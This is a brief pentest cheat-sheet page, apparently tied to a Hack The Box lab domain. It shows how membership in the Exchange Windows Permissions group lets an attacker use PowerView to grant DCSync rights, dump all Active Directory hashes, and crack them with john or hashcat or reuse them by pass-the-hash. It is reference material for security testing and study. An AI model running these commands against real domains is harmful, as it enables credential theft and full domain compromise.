# Exchange Windows Permissions

During the installation of Microsoft Exchange, several security groups related to Exchange are created in Active Directory. The **Exchange Windows Permissions** group has write DACL permissions on the domain.

### Attack

An attacker could abuse this by modifying the ACL to gain **DCSync** replication privileges, allowing them to perform a sync to obtain all Active Directory hashes, which could then be used for privilege escalation across the entire domain.

### Tools

[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

## Example

First, verify membership in the **Exchange Windows Permissions** group.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/exchangeWin_1.png)

To modify the ACL, use the `PowerView.ps1` tool and its `Add-DomainObjectACL` function as shown below:

```
Import-Module .\PowerView.ps1
Add-DomainObjectACL -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity [user] -Rights DCSync
```

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/exchangeWin_2.png)

With DCSync enabled, you can collect all user hashes using [[mimikatz]] or, for example, with the `secretsdump.py` tool from Impacket as shown below.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/exchangeWin_3.png)

At this point, you can either perform a hash cracking attack or directly use **Pass The Hash** to gain execution with a privileged user.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/groups/exchangeWin_4.png)

For NTLM hash cracking, you can use tools like `john` or `hashcat`, as shown below:

```
john --format=NT --wordlist=rockyou.txt hashes.txt
hashcat -m 1000 -a 0 --username hashes.txt ~/wordlists=rockyou.txt
```
